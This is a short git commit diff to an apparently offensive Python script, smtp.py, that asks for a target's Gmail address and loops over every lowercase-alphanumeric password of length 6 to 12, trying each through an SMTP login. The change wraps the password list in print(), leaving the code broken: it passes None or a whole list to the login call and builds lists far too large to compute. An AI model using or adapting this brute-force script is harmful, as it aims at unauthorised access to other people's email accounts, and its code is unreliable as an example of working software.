3972df75f430cd4037e37332c001a035cd3292ab
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-27 20:05:17 +0100

    Update smtp.py

--- smtp.py
+++ smtp.py
@@ -8,7 +8,7 @@ smtpserver.starttls()
 user = raw_input("Enter Target's Gmail Address: ") 
 
 for n in range(6, 12+1):
-         password = list(map(''.join, itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n)))
+         password = print(list(map(''.join, itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n))))
          
          try: 
              smtpserver.login(user, password) 
